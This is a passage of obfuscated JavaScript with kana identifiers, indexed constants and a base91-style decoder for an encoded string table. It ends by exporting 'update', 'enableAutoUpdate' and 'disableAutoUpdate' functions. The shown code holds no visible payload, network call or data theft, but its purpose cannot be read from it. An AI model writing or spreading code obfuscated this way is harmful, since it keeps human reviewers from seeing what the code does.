      if (にし[ふく[0x1f]] < ふく[0x3]) {
        にし[ふく[0x1f]] = にし[ふく[0x2c]];
      } else {
        すけ(
          (にし[ふく[0x1f]] += にし[ふく[0x2c]] * ふく[0x20]),
          (にし[ふく[0x10]] |= にし[ふく[0x1f]] << にし[ふく[0x42]]),
          (にし[ふく[0x42]] +=
            (にし[ふく[0x1f]] & ふく[0x23]) > ふく[0x24]
              ? ふく[0x7]
              : ふく[0x25]),
        );
        do {
          すけ(
            にし[ふく[0xe]].push(にし[ふく[0x10]] & ふく[0xc]),
            (にし[ふく[0x10]] >>= ふく[0x4]),
            (にし[ふく[0x42]] -= ふく[0x4]),
          );
        } while (にし[ふく[0x42]] > ふく[0x8]);
        にし[ふく[0x1f]] = -ふく[0x1];
      }
    }
    if (にし[ふく[0x1f]] > -ふく[0x1]) {
      にし[ふく[0xe]].push(
        (にし[ふく[0x10]] | (にし[ふく[0x1f]] << にし[ふく[0x42]])) & ふく[0xc],
      );
    }
    return らに(にし[ふく[0xe]]);
  }
  function はよ(...にし) {
    にし[ふく[0x0]] = ふく[0x1];
    if (typeof にく[にし[ふく[0x3]]] === ふく[0x11]) {
      return (にく[にし[ふく[0x3]]] = あく(ちこ[にし[ふく[0x3]]]));
    }
    return にく[にし[ふく[0x3]]];
  }
  const つと = {
    [はよ(0x94)]: update,
    [はよ(0x95)]: enableAutoUpdate,
    [はよ(0x96)]: disableAutoUpdate,
  };
  for (const をて of Object[はよ(0x97)](にゆ)) {
    すけ(きつ(くに), きつ(しほ));
    function しほ(...にし) {
      すけ(
        (にし[ふく[0x0]] = ふく[0x1]),
        (にし[ふく[0x55]] =
          'TAY#y*"bhn^Zw<Ul@g&1P{N/X!oS]Wx40r3=F%sOBQ>`ut2:.8efdDC7vcG6Hq+IRk$JM|K[,5pjimEzL~aV()_?;9}'),
        (にし[ふく[0x2]] = "" + (にし[ふく[0x3]] || "")),
        (にし[ふく[0x6]] = にし[ふく[0x2]].length),
        (にし[-ふく[0x58]] = []),
        (にし[ふく[0x21]] = ふく[0x3]),
        (にし[-ふく[0x57]] = ふく[0x3]),
        (にし[ふく[0x1f]] = -ふく[0x1]),
      );
      for (
        にし[-ふく[0x56]] = ふく[0x3];
        にし[-ふく[0x56]] < にし[ふく[0x6]];
        にし[-ふく[0x56]]++
      ) {
        にし[ふく[0x1e]] = にし[ふく[0x55]].indexOf(
          にし[ふく[0x2]][にし[-ふく[0x56]]],
        );
        if (にし[ふく[0x1e]] === -ふく[0x1]) continue;
        if (にし[ふく[0x1f]] < ふく[0x3]) {
          にし[ふく[0x1f]] = にし[ふく[0x1e]];
        } else {
          すけ(
            (にし[ふく[0x1f]] += にし[ふく[0x1e]] * ふく[0x20]),
            (にし[ふく[0x21]] |= にし[ふく[0x1f]] << にし[-ふく[0x57]]),
            (にし[-ふく[0x57]] +=
              (にし[ふく[0x1f]] & ふく[0x23]) > ふく[0x24]
                ? ふく[0x7]
                : ふく[0x25]),
          );
          do {
            すけ(
              にし[-ふく[0x58]].push(にし[ふく[0x21]] & ふく[0xc]),
              (にし[ふく[0x21]] >>= ふく[0x4]),
              (にし[-ふく[0x57]] -= ふく[0x4]),
            );
          } while (にし[-ふく[0x57]] > ふく[0x8]);
          にし[ふく[0x1f]] = -ふく[0x1];
        }
      }
      if (にし[ふく[0x1f]] > -ふく[0x1]) {
        にし[-ふく[0x58]].push(
          (にし[ふく[0x21]] | (にし[ふく[0x1f]] << にし[-ふく[0x57]])) &
            ふく[0xc],
        );
      }
      return らに(にし[-ふく[0x58]]);
    }
    function くに(...にし) {
      にし[ふく[0x0]] = ふく[0x1];
      if (typeof にく[にし[ふく[0x3]]] === ふく[0x11]) {
        return (にく[にし[ふく[0x3]]] = しほ(ちこ[にし[ふく[0x3]]]));
      }
      return にく[にし[ふく[0x3]]];
    }
    if (をて in つと) {
      continue;
    }
    Object[はよ(0x98)](つと, をて, {
      [くに(0x99)]: !0x0,
      [くに(0x9a)]: () => {
        return にゆ[をて];
      },
    });
  }
  return つと;
}
export default とる();
function すけ() {
  すけ = function () {};
}
